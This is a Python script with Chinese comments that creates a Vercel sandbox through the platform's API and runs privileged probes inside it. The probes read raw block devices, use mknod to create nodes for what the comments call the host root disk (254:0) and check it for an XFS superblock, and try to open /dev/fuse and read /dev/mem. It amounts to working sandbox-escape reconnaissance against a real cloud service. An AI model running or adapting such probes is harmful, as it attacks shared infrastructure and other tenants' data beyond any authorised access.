# 实验J248: 决定性测试 - mknod 宿主设备(254:0) + 读取验证 XFS 魔数
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj248"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE_A = r'''
import subprocess, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# /dev 完整列表 (找 254:0 对应节点)
r = subprocess.run("ls -la /dev/ | grep -E '^b|c' ; echo ===; lsblk 2>/dev/null | head; echo ===; cat /proc/partitions", shell=True, capture_output=True, text=True, timeout=10)
p("DEVALL", (r.stdout + r.stderr)[:2500].replace(chr(10), "|"))
# 尝试直接 open 现有 vda/vdb (sudo)
for dev in ("/dev/vda", "/dev/vdb"):
    code = (
        "import os; fd=os.open('%s', os.O_RDONLY); "
        "d=os.read(fd, 512); print('READ', len(d), d[:8].hex(), flush=True); os.close(fd)" % dev
    )
    try:
        r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=8)
        p("READ", dev, "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
    except Exception as e:
        p("READ", dev, "EXC", type(e).__name__, str(e)[:80])
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_DEVREAD", timeout=100)

CODE_B = r'''
import subprocess, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# mknod 254:0 (宿主根) 253:0/253:16 等 + 读取
tests = [
    ("hostroot_254_0", 254, 0),
    ("vda_253_0", 253, 0),
    ("vdb_253_16", 253, 16),
    ("hostroot_254_16", 254, 16),
]
for name, maj, min_ in tests:
    path = "/tmp/" + name
    code = (
        "import os; "
        "os.mknod('%s', 0o600 | 0o6000, os.makedev(%d, %d)); "
        "fd=os.open('%s', os.O_RDONLY); "
        "d=os.read(fd, 512); "
        "print('READ', len(d), d[:16].hex(), flush=True); os.close(fd)" % (path, maj, min_, path)
    )
    try:
        r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=8)
        p("MKNOD_READ", name, "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
    except Exception as e:
        p("MKNOD_READ", name, "EXC", type(e).__name__, str(e)[:80])
# 若 254:0 可读, 用 XFS 魔数判断: XFSB (XFS superblock magic = 0x58465342)
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_MKNOD", timeout=100)

CODE_C = r'''
import subprocess, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# /dev/fuse: open + 尝试 mount fuse
code = (
    "import os; fd=os.open('/dev/fuse', os.O_RDWR); print('FUSE_OPEN', 'OK', flush=True); os.close(fd)"
)
try:
    r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=8)
    p("FUSE", "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:200].replace(chr(10), "|"))
except Exception as e:
    p("FUSE", "EXC", type(e).__name__, str(e)[:80])
# fuse 挂载测试 (userns 内 mount fuse 需要 fuse 权限)
r = subprocess.run("mkdir -p /tmp/fm; sudo -n mount -t fuse fuse /tmp/fm 2>&1; echo rc=$?", shell=True, capture_output=True, text=True, timeout=10)
p("FUSE_MOUNT", (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
# /dev/mem 读取
code = (
    "import os; fd=os.open('/dev/mem', os.O_RDONLY); d=os.read(fd, 64); print('MEM_READ', len(d), d.hex(), flush=True); os.close(fd)"
)
try:
    r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=8)
    p("MEM", "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:200].replace(chr(10), "|"))
except Exception as e:
    p("MEM", "EXC", type(e).__name__, str(e)[:80])
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_FUSE", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
